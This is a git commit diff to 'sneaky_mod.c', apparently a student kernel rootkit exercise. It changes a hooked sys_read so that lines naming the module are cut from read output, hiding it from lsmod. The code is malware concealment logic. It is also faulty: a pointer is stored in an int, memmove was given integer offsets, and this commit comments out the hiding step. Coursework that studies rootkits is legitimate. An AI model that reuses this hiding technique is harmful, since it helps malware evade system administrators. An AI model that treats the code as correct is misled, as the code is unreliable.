2ce9b179bce1d153902747fccc56ebf350d1d90f
Koushik Annareddy Sreenath <ka266@duke.edu>
2023-05-02 15:29:30 -0400

    Trying to hid from lsmod

--- sneaky_mod.c
+++ sneaky_mod.c
@@ -105,13 +105,15 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 
   char * original_buf = (char *) regs->si;
   char * sneaky_mod_buf = strstr(original_buf, "sneaky_mod");
+  
   if( sneaky_mod_buf != NULL){
     int pos_begining = sneaky_mod_buf - original_buf;
-    int pos_end = strpos(sneaky_mod_buf, "\n", 0);
+    int pos_end = strchr(sneaky_mod_buf, '\n');
     int line_size = pos_end - pos_begining;
-    memmove(pos_begining, pos_end, line_size);
-    sneaky_result -= line_size;
+    //  memmove(pos_begining, pos_end, line_size);
+    // sneaky_result -= line_size;
   }
+  
   return sneaky_result;
 }
 
